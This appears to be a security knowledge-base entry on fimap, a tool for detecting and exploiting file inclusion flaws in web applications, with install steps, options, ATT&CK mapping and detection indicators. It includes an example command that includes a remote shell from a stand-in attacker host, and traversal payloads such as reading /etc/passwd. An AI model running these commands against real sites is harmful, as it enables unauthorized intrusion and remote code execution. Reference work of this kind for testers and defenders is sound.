---
id: 91676ce1-6152-4564-a80d-50c065bebb4b
type: tool
verified: true
created_at: '2019-08-28T21:17:40.560234+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Web
tags:
  - lfi
  - rfi
  - exploitation
  - web
  - recon
url: 'https://github.com/savio-code/fimap'
commands:
  - '[[commands/fimap-basic-lfi-scan]]'
  - '[[commands/fimap-google-dork-search]]'
  - '[[commands/fimap-exploit-lfi-read-file]]'
  - '[[commands/fimap-rfi-exploit-remote]]'
validated: true
---

# fimap

**Status**: Unverified

## Overview

fimap is an open-source Python tool specialized in detecting, auditing, and exploiting Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities in web applications. It automates the process of identifying vulnerable parameters, generating payloads, and performing exploitation, making it a valuable asset for penetration testers focusing on web application security assessments.

## Description

Similar to sqlmap for SQL injection flaws, fimap targets file inclusion bugs by analyzing URLs, testing parameters for inclusion vectors, and supporting both local (LFI) and remote (RFI) exploitation. It can read sensitive files, execute remote code, and even integrate Google dorking for target discovery. The tool is particularly useful in offensive security operations for initial access via web vulnerabilities and post-exploitation file access.

## Features

- Automatic parameter discovery and fuzzing for LFI/RFI
- Payload generation with support for encoding (base64, URL, etc.) to bypass filters
- Exploitation capabilities including file reading, command execution, and remote shell inclusion
- Google integration for dork-based reconnaissance
- Multi-level testing (1-5) for thoroughness vs. speed
- Support for proxies, cookies, and custom headers to mimic real traffic

## Installation

### Requirements

- Python 2.7 or 3.x
- Git for cloning the repository
- No additional pip dependencies required (uses standard libraries like urllib)

### Install Commands

```bash
# Clone the repository
git clone https://github.com/savio-code/fimap.git

# Navigate to the directory
cd fimap

# Make executable if needed (on Linux/macOS)
chmod +x fimap.py
```

On Kali Linux, it may be available via apt: `apt install fimap`, but cloning from source is recommended for the latest version.

## Basic Usage

```bash
python fimap.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -u, --url | Specify target URL with parameter placeholder |
| -d, --dork | Use Google dork for target discovery |
| -p, --param | Manually specify parameter to test |
| --level <1-5> | Set testing depth (1=fast, 5=thorough) |
| --exploit | Switch to exploitation after detection |
| -v, --verbose | Enable verbose output for debugging |
| --proxy | Use proxy for requests (e.g., --proxy http://127.0.0.1:8080) |

## Examples

### Example 1: Basic Usage

Scan a URL for LFI vulnerabilities:

```bash
python fimap.py -u "http://example.com/index.php?page=$_PAYLOAD"
```

### Example 2: Advanced Usage

Exploit RFI with a remote file:

```bash
python fimap.py -u "http://example.com/vuln.php?include=$_PAYLOAD" --exploit --rfi "http://attacker.com/shell.php" --level=3
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery
- [[Execution through API]] Native API (for file inclusion leading to execution)

### Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual HTTP requests with directory traversal patterns (e.g., ../../../etc/passwd) in logs
- Google API or dork-related outbound traffic from scanning tools
- Anomalous file access attempts on web servers (e.g., /proc/self/environ reads)
- Presence of fimap.py in process lists or network forensics showing Python requests to vulnerable endpoints
- WAF/IPS alerts for LFI/RFI signatures

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/sqlmap]]
- [[tools/Burp-Suite]]
- [[tools/dirbuster]]

## References

- Official GitHub: https://github.com/savio-code/fimap
- Documentation: Included in repo README
- Related: OWASP File Inclusion Cheat Sheet
